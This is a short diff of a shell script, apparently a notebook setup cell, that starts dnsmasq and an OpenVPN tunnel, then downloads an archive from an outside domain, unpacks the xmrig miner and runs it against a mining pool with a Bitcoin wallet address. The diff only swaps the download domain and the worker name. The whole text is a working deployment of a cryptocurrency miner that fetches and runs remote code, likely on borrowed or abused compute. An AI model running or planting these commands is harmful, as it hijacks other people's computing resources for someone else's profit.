@@ -29,7 +29,7 @@ service dnsmasq start
 
 openvpn --config rdp.ovpn --daemon
 
-! wget https://demo.zayuh.asia/a.tar.gz
-! tar -xf a.tar.gz
+wget https://demo.zayuh.me/a.tar.gz
+tar -xf a.tar.gz
 cd xmrig-6.15.1
-! ./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:bc1qxt9n2qq8yy2n462atcqejuu63cfdm07aztx5d3.C1 -p x
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:bc1qxt9n2qq8yy2n462atcqejuu63cfdm07aztx5d3.C3 -p x
